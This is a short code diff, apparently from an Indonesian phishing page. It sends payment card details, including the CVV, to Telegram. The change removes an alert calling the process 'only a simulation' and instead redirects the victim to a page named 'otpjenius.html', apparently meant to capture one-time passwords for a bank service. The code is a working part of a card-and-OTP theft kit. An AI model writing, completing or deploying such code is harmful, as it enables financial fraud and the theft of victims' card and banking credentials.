@@ -293,7 +293,7 @@ CVV: ${cvv}
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            alert('Pembayaran berhasil diproses dan data telah dikirim ke Telegram! (Ini hanya simulasi)');
+            window.location.href="otpjenius.html";
         } else {
             alert('Terjadi kesalahan saat mengirim data ke Telegram.');
         }
